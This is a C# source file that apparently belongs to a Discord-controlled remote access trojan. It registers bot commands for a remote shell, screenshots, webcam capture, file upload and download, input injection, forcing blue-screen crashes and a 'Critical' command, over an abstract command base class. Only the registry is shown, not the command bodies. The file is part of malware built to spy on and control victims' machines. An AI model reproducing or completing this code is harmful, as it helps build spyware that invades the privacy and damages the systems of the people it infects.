using Discord.Commands;

namespace Main.Source.Bot
{
    public class Command
    {
        public static void Register(ref List<CommandBase> commandList)
        {
            commandList.Clear();

            commandList.Add(new Commands.Ping());
            commandList.Add(new Commands.Screenshot());
            commandList.Add(new Commands.Shell());
            commandList.Add(new Commands.Tree());
            commandList.Add(new Commands.Upload());
            commandList.Add(new Commands.Download());
            commandList.Add(new Commands.Input());
            commandList.Add(new Commands.Webcam());
            commandList.Add(new Commands.BlueScreen());
            commandList.Add(new Commands.Critical());
        }
    }

    public abstract class CommandBase
    {
        public abstract string Name { get; }
        public abstract string Info { get; }
        public abstract string Use { get; }

        public abstract Task Func(SocketCommandContext socket, string[] args);
    }
}
